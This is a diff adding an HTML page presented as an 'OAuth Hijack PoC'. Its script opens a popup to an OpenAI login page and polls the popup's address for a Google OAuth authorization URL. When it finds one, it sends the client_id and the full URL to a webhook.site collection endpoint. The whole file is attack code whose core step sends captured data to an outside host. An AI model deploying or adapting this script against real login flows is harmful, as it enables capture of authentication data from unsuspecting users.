@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OAuth Hijack PoC</title>
+</head>
+<body>
+  <h2>OAuth Flow Hijack Demo</h2>
+  <button onclick="launch()">Start Attack</button>
+
+  <script>
+    const loginTarget = "https://auth.openai.com/log-in";
+
+    function launch() {
+      const win = window.open(loginTarget, "_blank", "width=900,height=700");
+
+      const interval = setInterval(() => {
+        try {
+          const loc = win.location.href;
+          if (loc.includes("accounts.google.com/o/oauth2/v2/auth")) {
+            const url = new URL(loc);
+            const clientId = url.searchParams.get("client_id");
+
+            fetch("https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                client_id: clientId,
+                full_url: loc
+              })
+            });
+
+            clearInterval(interval);
+            console.log("Captured client_id:", clientId);
+          }
+        } catch (err) {
+          // Ignore cross-origin errors
+        }
+      }, 500);
+    }
+  </script>
+</body>
+</html>
